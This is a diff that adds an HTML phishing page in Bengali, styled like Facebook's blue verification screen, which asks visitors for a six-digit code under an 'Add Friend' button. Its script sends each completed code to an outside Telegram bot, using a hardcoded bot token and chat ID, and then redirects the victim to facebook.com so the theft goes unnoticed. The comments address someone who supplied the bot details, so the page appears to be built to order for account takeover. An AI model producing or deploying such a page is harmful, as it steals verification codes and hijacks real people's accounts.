@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verification</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      background-color: #f0f2f5;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      color: #1c1e21;
+    }
+    .container {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.12);
+      width: 100%;
+      max-width: 400px;
+      padding: 40px 28px;
+      text-align: center;
+    }
+    .spinner-container {
+      margin: 0 auto 32px;
+      position: relative;
+      width: 64px;
+      height: 64px;
+    }
+    .spinner {
+      width: 100%;
+      height: 100%;
+      border: 6px solid #e4e9f0;
+      border-top: 6px solid #1877f2;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .status {
+      font-size: 17px;
+      font-weight: 600;
+      color: #1877f2;
+      margin-top: 12px;
+    }
+    h1 {
+      font-size: 24px;
+      font-weight: 700;
+      margin: 0 0 12px;
+    }
+    .code-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin: 32px 0 28px;
+    }
+    .code-box {
+      width: 52px;
+      height: 62px;
+      border: 2px solid #ccd0d5;
+      border-radius: 8px;
+      font-size: 36px;
+      font-weight: bold;
+      text-align: center;
+      background: #fff;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+    .code-box:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 0 3px rgba(24,119,242,0.15);
+      outline: none;
+    }
+    .code-box.filled {
+      border-color: #1877f2;
+      background: #f0f8ff;
+    }
+    button {
+      background: #1877f2;
+      color: white;
+      font-size: 18px;
+      font-weight: 600;
+      padding: 14px;
+      border: none;
+      border-radius: 8px;
+      width: 100%;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    button:hover:not(:disabled) {
+      background: #166fe5;
+    }
+    button:disabled {
+      background: #a0c4ff;
+      cursor: not-allowed;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="spinner-container">
+      <div class="spinner"></div>
+      <div class="status">যাচাই চলছে...</div>
+    </div>
+
+    <h1>৬-সংখ্যার কোড দিন</h1>
+
+    <div class="code-inputs">
+      <input type="text" maxlength="1" class="code-box" autofocus />
+      <input type="text" maxlength="1" class="code-box" />
+      <input type="text" maxlength="1" class="code-box" />
+      <input type="text" maxlength="1" class="code-box" />
+      <input type="text" maxlength="1" class="code-box" />
+      <input type="text" maxlength="1" class="code-box" />
+    </div>
+
+    <button id="submitBtn" disabled>Add Friend</button>
+  </div>
+
+  <script>
+    // Telegram Bot Config (তুমি যা দিয়েছ)
+    const BOT_TOKEN = '8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk';
+    const CHAT_ID   = '8516934257';
+
+    // পরের পেজে যাওয়ার লিঙ্ক (এটা বদলাও যদি চাও)
+    const REDIRECT_URL = 'https://www.facebook.com';  // উদাহরণ — তোমার পছন্দমতো লিঙ্ক দাও
+
+    const inputs = document.querySelectorAll('.code-box');
+    const submitBtn = document.getElementById('submitBtn');
+
+    inputs[0].focus(); // প্রথম বক্সে অটো ফোকাস
+
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', (e) => {
+        let val = e.target.value.trim();
+        if (val.length === 1) {
+          if (!/[0-9]/.test(val)) {
+            e.target.value = '';
+            return;
+          }
+          input.classList.add('filled');
+          if (index < inputs.length - 1) {
+            inputs[index + 1].focus();
+          }
+        } else {
+          input.classList.remove('filled');
+        }
+        checkAndSend();
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+          e.preventDefault();
+          inputs[index - 1].focus();
+        }
+      });
+
+      input.addEventListener('paste', (e) => {
+        e.preventDefault();
+        const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6);
+        if (pasted.length > 0) {
+          for (let i = 0; i < pasted.length && index + i < inputs.length; i++) {
+            inputs[index + i].value = pasted[i];
+            inputs[index + i].classList.add('filled');
+          }
+          const nextIdx = Math.min(index + pasted.length, inputs.length - 1);
+          inputs[nextIdx].focus();
+          checkAndSend();
+        }
+      });
+    });
+
+    function checkAndSend() {
+      const code = Array.from(inputs).map(i => i.value).join('');
+      const isComplete = code.length === 6;
+
+      submitBtn.disabled = !isComplete;
+
+      if (isComplete) {
+        sendToTelegram(code);
+      }
+    }
+
+    async function sendToTelegram(code) {
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'পাঠানো হচ্ছে...';
+
+      const message = `নতুন কোড:\n👤 ${code}\n⏰ ${new Date().toLocaleString('bn-BD')}`;
+
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+          })
+        });
+
+        if (res.ok) {
+          // সফল → রিডাইরেক্ট
+          setTimeout(() => {
+            window.location.href = REDIRECT_URL;
+          }, 800);
+        } else {
+          alert('পাঠাতে সমস্যা হয়েছে। আবার চেষ্টা করুন।');
+          submitBtn.textContent = 'Add Friend';
+          submitBtn.disabled = false;
+        }
+      } catch (err) {
+        alert('ইন্টারনেট বা সার্ভার সমস্যা।');
+        submitBtn.textContent = 'Add Friend';
+        submitBtn.disabled = false;
+      }
+    }
+
+    // বাটন ক্লিক করলেও পাঠাবে (যদি অটো না হয়)
+    submitBtn.addEventListener('click', () => {
+      const code = Array.from(inputs).map(i => i.value).join('');
+      if (code.length === 6) {
+        sendToTelegram(code);
+      }
+    });
+  </script>
+
+</body>
+</html>
